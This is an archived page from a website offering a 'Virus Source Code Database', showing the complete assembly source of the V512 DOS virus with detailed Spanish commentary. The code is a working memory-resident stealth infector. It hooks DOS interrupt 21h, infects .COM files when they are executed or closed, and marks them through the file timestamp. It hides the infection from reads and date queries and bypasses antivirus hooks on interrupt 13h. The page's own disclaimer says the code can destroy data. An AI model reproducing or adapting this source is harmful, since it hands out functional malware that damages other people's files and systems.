<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Formato de la infecci¢n:
;         Bytes   1 - 510 => virus
;               511 - 512 => dos primeros bytes programa
;        despu‚s del final del programa => 512 primeros bytes del programa
;
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             V512                                     ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   18-Jul-91                                            ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    9          Analysis Options on: HQRS                 ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int21hPoint     equ     4                       ; (76EF:0004=0)
data_4e         equ     0FE07h                  ; (76EF:FE07=0)
data_2e         equ     0200h

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

v512            proc    far

; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                       rutina de instalaci¢n
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

start:
                mov     si,4
                mov     word ptr [si+4Eh],0CB95h   ; CS:52h = CB95h
                                                   ; CS:52h = 95h = xchg ax,bp
                                                   ; CS:53h = CBh = ret
                xchg    ax,bp

                mov     ds,si
                lds     dx,dword ptr [si+8]     ; Load 32 bit ptr
                                    ;DS:DX => punto de entrada nueva int 13h
                                    ;en SI:[SI+8]

                mov     ah,13h
                int     2Fh      ; Multiplex/Spooler al=func 00h
                                 ; INT 2F - Multiplex - DOS 3.3+
                                 ; SET DISK INTERRUPT HANDLER
                                 ; AH = 13h
                                 ; DS:DX -> interrupt handler disk driver
                                 ; calls on read/write
                                 ; ES:BX = address to restore INT 13 to
                                 ; on system halt (exit from root
                                 ; shell) or warm boot (INT 19)
                                 ; Return:
                                 ;         DS:DX from previous invocation
                                 ; of this function
                                 ;         ES:BX from previous invocation
                                 ; of this function

                push    ds     ;DS:DX => vector a ROM entry point
                push    dx

                int     2Fh    ; Multiplex/Spooler al=func 00h

                               ; reinstala viejo vector guardando
                               ; rom entry point. OJO: En DR DOS
                               ; parece que esto falla.

                pop     ax
                mov     di,0F8h
                stosw                           ; Store ax to es:[di]
                pop     ax
                stosw                           ; Store ax to es:[di]
                                                ; ES = CS


                                              ; pone el rom entry point
                                              ; vector en ES:0F8h

                mov     ds,si
                lds     ax,dword ptr [si+40h]   ; Load 32 bit ptr
                                                ; SI = 4 = DS
                                                ; lds ax, [si + 40h] =
                                                ; lds ax, [4 + 40h]
                                                ; ds:44h = int 21h vector
                                                ; despu‚s de la operaci¢n
                                                ; queda int 21h vector
                                                ; en DS:AX


                cmp     ax,di     ; Esto ser  usado m s adelante, prox. jnz


                stosw              ; Store ax to es:[di]
                mov     ax,ds
                stosw              ; Store ax to es:[di]
                                   ; pone int 21h vector en
                                   ; ES:[DI]
                                   ; como DI era 0F8h, ahora es
                                   ; 0F8h + 4 (por los dos STOSW
                                   ; anteriores), despu‚s de la
                                   ; operaci¢n queda en ES:0F8h
                                   ; 13hOFS, 13hSEG, 21hOFS, 21hSEG
                                   ; Esto es inmediatamente
                                   ; antes del c¢digo del virus,
                                   ; los 4 words antes de 100h
                                   ; posici¢n llamada int21hPoint

                push    es         ;
                push    di         ; Guarda ES y DI
                                   ; (Referencia 1)

                jnz     loc_1      ; Jump if not zero
                                   ; Si ax <> di ( o sea,
                                   ; offset int 21h <> 0F8h + 4
                                   ; = 0FCh)
                                   ; Si es = 0FCh entonces puede que el
                                   ; virus est‚ instalado

                                   ; Por lo tanto habr  que
                                   ; verificarlo en detalle

                shl     si,1       ; Shift w/zeros fill
                mov     cx,0FFh
                repe    cmpsw      ; Rep zf=1+cx >0 Cmp [si] to es:[di]

                                   ; Se fija si est  instalado

                jz      loc_2      ; Jump if zero
                                   ; Si ambas strings son iguales
                                   ; est  instalado
                                   ; y entonces no instalo

loc_1:                             ;  xref 76EF:012A
                mov     ah,52h     ;
                int     21h        ; DOS Services  ah=function 52h
                                   ;  get DOS data table ptr es:bx


                push    es                 ; Guardo el segmento de la tabla

                mov     si,0F8h


                les     di,dword ptr es:[bx+12h]        ; Load 32 bit ptr

                                             ; ES:DI = 12h DWORD
                                             ; pointer to first disk buffer
                                             ; in buffer chain
                                             ; DOS 3.1 - 3.3

                                             ; EN DOS 4+ no anda: hay
                                             ; 12h = DWORD
                                             ; pointer to disk buffer
                                             ; info record

                mov     dx,es:[di+2]        ; DX = offset pr¢ximo disk buffer

                mov     cx,103h           ; mueve 103h words = 206h bytes =
                                          ; 518 bytes a partir de offset
                                          ; 0F8h
                                          ;
                rep     movs word ptr es:[di],word ptr ss:[si]
                                          ; Rep when cx >0 Mov [si] to es:[di]
                                          ; mov CS:[SI] to ES:[DI]
                                          ; Se copia a si mismo al primer
                                          ; buffer de disco
                                          ; a partir de CS:0F8h
                                          ; hasta CS:02FEh

                                          ; Supongo que ES:00 es
                                          ; igual a ES:DI, o sea el
                                          ; buffer empieza en el comienzo
                                          ; del segmento


                mov     ds,cx           ; DS = CX = 0
                mov     di,16h

                mov     word ptr [di+6Eh],0FCh
                mov     [di+70h],es
                                        ; pone en int 21h ptr
                                        ; ES:0FCh
                                        ; (ES: segmento del 1er buffer)

                                        ; apunta 21h al offset 0FCh del
                                        ; buffer de disco, o sea,
                                        ; en CS:01F4h

                pop     ds          ; pongo en DS el segmento de la tabla

                mov     [bx+14h],dx  ; offset 1er buffer lo hago = al segundo:
                                     ; el 2do buffer se convierte en el
                                     ; primero y el primer buffer queda
                                     ; reservado para el virus.

                mov     dx,ss        ; DX = SS = CS
                mov     ds,dx        ; DS = CS

                mov     bx,[di-14h]  ; DI = 16h
                                     ; BX = [CS:2] => byte 2 del PSP
                                     ; Segmento del
                                     ; primer byte despu‚s de la memoria
                                     ; asignada al programa por el DOS

                dec     bh           ; BX = BX - 100h
                mov     es,bx        ; ES = BX

                cmp     dx,[di]      ; DI = 16h
                mov     ds,[di]      ; CS:[16h] = segmento del PSP
                                     ; del prog. padre
                mov     dx,[di]      ; DS = DX = CS:[16] =
                                     ; segmento del PSP del prog. padre

                dec     dx
                mov     ds,dx        ; DS = Segmento del PSP del padre - 1

                mov     si,cx        ; SI = CX = 0

                mov     dx,di        ; DX = 16h

                mov     cl,28h       ; CX = 28h
                rep     movsw        ; Rep when cx >0 Mov [si] to es:[di]
                                     ; muevo 28h bytes CS:[00] a ES:[16h]
                                     ; a £ltimo segmento
                                     ; asignado - 100h

                mov     ds,bx        ; DS = 16h

                jc      loc_4        ; Jump if carry Set (Si seg. PSP padre
                                     ; > CS)
                                     ; entonces el padre es COMMAND.COM?

loc_2:                                          ;  xref 76EF:0133
                mov     si,cx               ; SI = CX = 0
                mov     ds,ss:[si+2Ch]      ; DS = CS:[2Ch] = Segmento del
                                            ; environment

loc_3:                                          ;  xref 76EF:0186
                lodsw                 ; String [si] to ax
                                      ; leo del environment un word

                dec     si            ; disminuyo SI en uno,
                                      ; como aument¢ en dos por el
                                      ; lodsw va aumentando de a uno

                and     ax,ax         ; hasta que encuentro
                                      ; un word 00 en el environment
                                      ; db 00 es de end of string, dw 00 es
                                      ; de end of environment

                jnz     loc_3         ; voy repitiendo


                lea     dx,[si+3]    ; load effective address de
                                     ; el punto que encontr¢ + 3
                                     ; EN DOS 3+ es el filename del
                                     ; programa due¤o del environment

loc_4:                                          ;  xref 76EF:017A

                mov     ax,3D00h
                int     21h         ; DOS Services  ah=function 3Dh
                                    ;  open file, al=mode,name@ds:dx
                                    ; Abre el archivo due¤o del
                                    ; environment para lectura solamente


                xchg    ax,bx      ; AX tiene el handle, despues de esto est 
                                   ; en BX

                pop     si         ; Pone en SI el word que est  en el
                push    si         ; tope del stack, que era el DI salvado
                                   ; antes, = 0100h (ver Referencia 1)

                push    ss         ; SS = CS
                pop     ds         ; DS = SS = CS

                push    ss         ;
                pop     es         ; ES = SS = CS

                mov     dx,si      ; DX = 100h

                mov     cl,2       ; CX = 02
                mov     ah,3Fh     ;
                int     21h        ; DOS Services  ah=function 3Fh
                                   ;  read file, cx=bytes, to ds:dx
                                   ; leo 2 bytes del archivo a
                                   ; DS:DX
                                   ; OJO! La t‚cnica Stealth ya est 
                                   ; funcionando, son los 2 primeros
                                   ; bytes del programa como si
                                   ; no estuviese infectado!
                                   ; lee los 2 primeros bytes del
                                   ; programa a CS:100h

                mov     dl,cl      ; DL = CL = 02h ; DX = 102h
                xchg    cl,ch      ; CX = 200h

                mov     di,2FEh

                cmpsw               ; Cmp [si] to es:[di]
                                    ; compara CS:100h con ES:2FEh
                                    ; como ES=CS=DS
                                    ; CS:100h con CS:2FEh
                                    ; en 2FEh estar¡a la primera
                                    ; instrucci¢n del programa
                                    ; Se fija si es correcto

                jnz     loc_5       ; Jump if not zero ????
                                    ; en AX estar¡a el file handle
                                    ; as¡ que no tiene sentido la int
                                    ; 21h...

                mov     ah,3Fh      ;

loc_5:                              ;  xref 76EF:01A7

                jmp     $-15Bh      ; jmp CS:50h
                                    ; en CS:50h hay las
                                    ; siguientes instrucciones:

                                    ; int 21h
                                    ; xchg ax,bp
                                    ; ret

                                    ; o sea que hace una lectura de disco
                                    ; y vuelve con retf (en el tope del stack
                                    ; hay 100h, as¡ que el retf lo vuelve
                                    ; a CS:100h, el principio del programa)
                                    ; Lee 512 bytes (200h)
                                    ; restaura la primera parte del programa
                                    ; (as¡ est  completo en memoria)
                                    ; y lo ejecuta como si no estuviese
                                    ; infectado

; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                          rutina para READ
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

loc_6:                                          ;  xref 76EF:020A
                                                ; rutina para READ

                call    sub_1                   ; (02E5)

                mov     si,es:[di]    ; SI = offset en file

                mov     ah,3Fh        ; '?'
                int     21h           ; DOS Services  ah=function 3Fh
                                      ;  read file, cx=bytes, to ds:dx
                                      ; leo lo que me pidieron

                cmp     si,bp         ; SI = 200h?

                jae     loc_8         ; Jump if above or =
                                      ; le¡ desde despu‚s de los primeros
                                      ; 512 bytes del archivo?
                                      ; me voy a loc_8, vuelvo de la int.
                                      ; el archivo es igual

                push    ax            ; guardo ax

                mov     al,es:[di-8]    ; pongo en AL file
                                        ; time en formato packed

                not     al
                and     al,1Fh         ; No est  infectada?

                jnz     loc_7          ; Jump if not zero
                                       ; ya le¡ y vuelvo de la int

                                      ; si est  infectado
                                      ; y le¡ desde antes de los
                                      ; 512 bytes del archivo
                                      ; hay que corregir lo le¡do para
                                      ; que no se note la infecci¢n

                add     si,es:[di-4]  ; offset en file =
                                      ; offset en file + file size

                xchg    si,es:[di]    ; offset en file =
                                      ; offset en file + file size
                                      ; guardo en SI el offset en file
                                      ; que quer¡a leer
                                      ; y en el FST pongo el offset
                                      ; donde realmente est  la informaci¢n
                                      ; que deber¡a estar ah¡

                add     es:[di-4],bp  ; sumo 512 bytes al tama¤o del archivo
                                      ; para compensar "error" en el
                                      ; directorio
                                      ; y no me d‚ EOF

                mov     ah,3Fh        ;
                int     21h           ; DOS Services  ah=function 3Fh
                                      ;  read file, cx=bytes, to ds:dx
                                      ; leo lo que deber¡a haber le¡do
                                      ; si el virus no estuviese
                                      ; (stealth!)

                                      ; notar que si me paso del l¡mite
                                      ; entre virus-c¢digo, (offset 512)
                                      ; la lectura anterior ya ley¢
                                      ; los bytes que deber¡a haber le¡do
                                      ; luego de este l¡mite, y el DOS
                                      ; encuentra un EOF y lee s¢lo lo
                                      ; necesario como para que quede
                                      ; la informaci¢n correctamente
                                      ; como si el virus no estuviese


                sub     es:[di-4],bp  ; vuelvo el tama¤o a su normalidad

                xchg    ax,si         ; pongo en SI n£mero de bytes le¡dos
                                      ; y en AX offset en file "declarado"

                stosw             ; Store ax to es:[di]
                                  ; vuelvo todo a la normalidad
                                  ; pongo el offset donde deber¡a estar
                                  ; si el virus no estuviese
                                  ; y vuelvo de la interrupt

loc_7:                            ;  xref 76EF:01C5, 01F2, 0226
                pop     ax
loc_8:                            ;  xref 76EF:01BA
                pop     es
                pop     si
                pop     di
                pop     bp        ; restauro registros
                retf    2         ; Return far
                                  ; vuelvo de la interrupci¢n

; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                 rutina para Get file date and time
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

loc_9:                                          ;  xref 76EF:0210
                                                ; rutina para
                                                ; Get file date and time

                int     21h                     ; Hago el Get file
                                                ; date and time
                                                ; como si nada.

                lahf                            ; Load ah from flags

                mov     al,cl
                and     al,1Fh
                cmp     al,1Fh                  ; Si los segundos son
                                                ; = 1Fh, el archivo est 
                                                ; infectado
                jne     loc_10                  ; Jump if not equal
                xor     cl,al
loc_10:                                         ;  xref 76EF:01ED
                sahf                            ; Store ah into flags

                                                ; restaur‚ fecha normal

                jmp     short loc_7             ; (01DC)
                                       ; vuelvo de la interrupci¢n
                                       ; restaurando AX


 ; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
 ;                  Punto de entrada int 21h  del virus
 ; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

                push    bp
                push    di
                push    si
                push    es        ; Guarda registros que va a usar

                cld                    ; Clear direction

                mov     bp,sp          ; "vac¡o" el stack

                mov     es,[bp+0Ah]    ; pone en ES el valor del byte
                                       ; 0Ah del stack

                mov     di,010B      ;
                mov     si,di        ;  SI = DI = 010Bh

                cmps word ptr cs:[si],word ptr es:[di]  ; Cmp [si] to es:[di]

                                   ; se fija si en ES:010Bh hay lo mismo que
                                   ; en CS:010Bh
                                   ; el valor de ES lo saca del stack
                                   ; es el segmento de donde se llam¢ a la
                                   ; interrupt
                                   ; CS:010Bh es el offset de esta misma
                                   ; instrucci¢n
                                   ; si son iguales
                                   ; es que se llam¢ desde este CS, o sea,
                                   ; de este c¢digo,
                                   ; por lo tanto se debe seguir con la
                                   ; int 21h original
                                   ; si no redirecciona lo que le
                                   ; interesa
;    Se fija en el stack el segmento desde donde fue llamada la interrupci¢n,
; luego se fija si en ese segmento, en el offset 10Bh est  el mismo word que en
; el offset 10Bh de su CS. Por supuesto, para darle m s "sabor" a esto, en ese
; word de el CS est  el mism¡simo CMPS con que logra todo esto...



                jz      loc_12     ; Jump if zero
                                   ; Si son iguales, vuelvo a int 21h original

                cmp     ah,3Fh     ; Es Read?
                je      loc_6      ; Jump if equal

                push    ax         ; guardo AX

                cmp     ax,5700h   ; Es Get file date and time?
                je      loc_9      ; Jump if equal


                cmp     ah,3Eh     ; Es close file?
                pushf              ; Push flags
                push    bx
                push    cx
                push    dx
                push    ds         ; guardo m s registros
                jz      loc_14     ; Jump if zero
                                   ; salto a rutina de close file

                cmp     ax,4B00h   ; Es EXEC load and execute?
                je      loc_13     ; Jump if equal


loc_11:                                         ;  xref 76EF:023A, 02B2
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                popf                            ; Pop flags
                jz      loc_7                   ; Jump if zero
                pop     ax
loc_12:                                         ;  xref 76EF:0205
                pop     es
                pop     si
                pop     di
                pop     bp    ; restauro registros

                jmp     dword ptr cs:int21hPoint    ; (76EF:0004=0)
                                                ; retomo int. 21h original
                                                ; no modifiqu‚ nada.


; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                 rutina para EXEC load and execute
;                       Ac  es donde infecta!
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß


loc_13:                                         ;  xref 76EF:021F
                              ; rutina para EXEC load and execute

                mov     ah,3Dh      ;
                int     21h         ; DOS Services  ah=function 3Dh
                                    ;  open file, al=mode,name@ds:dx

                xchg    ax,bx       ; guardo el handle en BX


; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                        rutina  de close file
;                        Ac  es donde infecta!
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

loc_14:                                         ;  xref 76EF:021A

                                  ; rutina de close file

                call    sub_1     ; (02E5)
                                  ; obtengo:
                                  ;ES:DI puntero a offset actual del
                                  ; archivo en FST
                                  ;BP: 200h (512 decimal, longitud
                                  ; del virus en el file)


                jc      loc_11    ; Jump if carry Set
                                  ; Si hubo error, vuelvo de la int.

                xor     cx,cx    ; Zero register
                                 ; CX = 0
                xchg    cx,bp    ; BP = 0 ; CX = BP = 200h
                mov     ds,bp    ; DS = 0
                mov     si,4Ch   ; SI = 4Ch
                mov     ax,203h  ; AX = 203h
                mov     dx,cs    ; DX = CS

                xchg    ax,[si+44h]  ; Pongo Int 24h
                xchg    dx,[si+46h]  ; en CS:203h
                                     ; ver Int 24h Interrupt Handler
                                     ; lo que hace el handler es devolver
                                     ; "fail system call in progress"


                push    dx     ; Guardo en el stack el vector original
                push    ax     ; a int 24h


                lodsw          ; String [si] to ax
                push    ax
                lodsw          ; String [si] to ax
                push    ax
                               ; Guardo en el stack pointer a int 13h

                lds     dx,dword ptr cs:[si-50h]        ; Load 32 bit ptr
                                   ; SI = 0
                                   ; pongo en DS:DX lo que hay en CS:00
                                   ; es el puntero a Int 13h del Rom Bios

                mov     ax,2513h
                push    ax         ; guardo AX en el stack

                int     21h        ; DOS Services  ah=function 25h
                                   ;  set intrpt vector al to ds:dx
                                   ; pongo int 13h apuntando a la
                                   ; rutina original del ROM Bios
                                   ; para evitar la acci¢n de antivirus

                push    es
                pop     ds         ; DS = ES


                mov     [di],bp     ; Pongo en offset de file 0

                mov     [di-13h],ch  ; Pongo CH en file open mode
                                     ; CH = 02h
                                     ; (read - write)

                cmp     word ptr [di+13h],4F43h  ; Extensi¢n del
                                                 ; nombre del archivo
                                                 ; es "co?"?

                jne     loc_17    ; Jump if not equal
                                  ; Si no es as¡, vuelvo a la int. normal

                mov     dx,[di-4]  ; pongo en DX el tama¤o del archivo

                add     dh,ch      ; DH = DH + 2
                cmp     dh,4       ; Si no es mayor a 200h (512 bytes)

                jb      loc_17     ; Jump if below
                                   ; me voy sin infectar
                                   ; (muy chico el archivo)
                                   ; y sigo con int. normal

                test    ch,[di-11h] ; Test de atributo del file
                                    ; si es hidden (02h)

                jnz     loc_17      ; Jump if not zero
                                    ; Si el archivo es oculto, no
                                    ; infectar, vuelvo a la int. normal

                lds     si,dword ptr [di-0Eh]   ; Load 32 bit ptr
                                                ; Pongo en DS:SI
                                                ; pointer to device driver
                                                ; header if character device
                                                ; else pointer to DOS Drive
                                                ; Parameter Block (see AH=32h)

                cmp     [si+4],ch    ; CH = 02
                                     ; Offset 4 = highest sector
                                     ; number within a cluster
                                     ; (sectores por cluster)

                jbe     loc_15       ; Jump if below or =
                                     ; si es menos sigo,
                                     ; Si es m s que 2, vuelvo de la
                                     ; interrupci¢n

                dec     dx           ; DX = file length + 200h - 1

                shr     dh,1         ; divido DH por dos

                and     dh,[si+4]    ;

                jz      loc_17        ; Jump if zero
loc_15:                               ;  xref 76EF:0283

                mov     ds,bp         ; DS = 0

                mov     dx,cx         ; DX = 200h

                mov     ah,3Fh        ;
                int     21h           ; DOS Services  ah=function 3Fh
                                      ;  read file, cx=bytes, to ds:dx
                                      ; leo 512 bytes a 0000:0200h
                                      ; (final de tabla de interrupts,
                                      ; poco usado)

                mov     si,dx        ; SI = 200h
                dec     cx
                dec     cx           ; CX = 01FFh

locloop_16:                                     ;  xref 76EF:02A1
                lodsb                           ; String [si] to al
                cmp     al,cs:0FE07h[si]        ; (76EF:FE07=0)
                                                ;
                                                ; 0FE07 + 201h = 07h
                                                ;
                jne     loc_18                  ; Jump if not equal
                loop    locloop_16              ; Loop if cx > 0

                                       ; Compara lo cargado con el virus en
                                       ; memoria
                                       ; si no es igual sigo, si es igual
                                       ; vuelvo de la interrupt


loc_17:                            ;  xref 76EF:026C, 0276, 027B, 028B
                                   ;            02E3
                mov     ah,3Eh     ;
                int     21h        ; DOS Services  ah=function 3Eh
                                   ;  close file, bx=file handle
                                   ; Cierro el archivo


                pop     ax      ; AX = 2513h ?
                pop     ds
                pop     dx
                int     21h     ; DOS Services  ah=function 25h
                                ;  set intrpt vector al to ds:dx
                                ; restauro int 13h original

                pop     dx
                pop     ds
                mov     al,24h  ;
                int     21h     ; DOS Services  ah=function 25h
                                ;  set intrpt vector al to ds:dx
                                ; restauro int 24h original

                jmp     loc_11  ; (0221)
                                ; vuelvo de la int 21h
                                ;

loc_18:                         ;  xref 76EF:029F

                mov     cx,dx     ; CX = 200h

                mov     si,es:[di-4]  ; SI = File Size

                mov     es:[di],si    ; ES:[DI] = posici¢n del file pointer
                                      ; al final del archivo

                mov     ah,40h       ;
                int     21h          ; DOS Services  ah=function 40h
                                     ;  write file cx=bytes, from ds:dx
                                     ; Escribo lo que le¡ del principio del
                                     ; archivo en el final

                mov     es:[di-4],si ; pongo el file size como estaba antes
                                     ; de escribir (para que no aumente en el
                                     ; directorio)

                xchg    ax,bp        ; AX = BP = 0

                stosw                 ; Store ax to es:[di]
                                      ; Posiciono el file pointer
                                      ; al principio del archivo
                                      ; DI = DI + 2

                jc      loc_19        ; Jump if carry Set
                                      ; Si hubo alg£n error vuelvo de la int

                mov     ax,DS:data_2e     ; (76EF:0200=8B01h)
                                      ; AX = primeros dos bytes del
                                      ; programa infectado

                push    cs
                pop     ds           ; DS = CS

                mov     word ptr ds:[206h],ax   ; (76EF:0206=8022h)
                                                ; Pongo AX al final del c¢digo
                                                ; del virus
                mov     dx,8      ; DX = 8

                mov     ah,40h    ;

                int     21h       ; DOS Services  ah=function 40h
                                  ;  write file cx=bytes, to ds:dx
                                  ; Escribo 512 bytes del c¢digo del virus
                                  ; al principio del programa


                or      byte ptr es:[di-0Ah],1Fh    ; Segundos del archivo
                                                    ; infectado

loc_19:                                         ;  xref 76EF:02C8

                or      byte ptr es:[di-11h],40h   ; cierro el archivo?
                                                   ;

                jmp     short loc_17            ; (02A3)
                                                ; Vuelvo de la interrupt


 v512            endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;
;         Called from:   76EF:01AE, 0237
;
;               Entra:
;                    BX handle de archivo
;
;               Sale:
;                    ES:DI puntero a offset actual del archivo en FST
;                    BP: 200h (512 decimal, longitud del virus en el file)
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                push    bx           ; guardo BX (file handle)

                mov     ax,1220h
                int     2Fh          ; Multiplex/Spooler al=func 20h
                                     ; Get Job File Table entry
                                     ; devuelve en ES:DI puntero a
                                     ; System File Table de archivo
                                     ; en proceso


                mov     bl,es:[di]   ; recupero n£mero de SFT

                mov     ax,1216h
                int     2Fh          ; Multiplex/Spooler al=func 16h
                                     ; busco adress de SFT de archivo en
                                     ; proceso (en BL tengo el n£mero
                                     ; de SFT correspondiente)


                pop     bx           ; recupero handle

                                     ; obtuve en ES:DI adress
                                     ; de system file table

                mov     bp,200h      ; 512 en hexa!

                lea     di,[di+15h]   ; Load effective addr
                                      ; adress de offset actual en
                                      ; el archivo
                retn


sub_1           endp


; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;           Interrupt 24h handler mientras est  infectando
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; lo que hace el handler es devolver siempre
; "fail system call in progress"

                mov     al,3
                iret

                db      0CDh, 20h ; dos primeros bytes del programa infectado


seg_a           ends



                end     start



</textarea></td></tr></table></body></html>
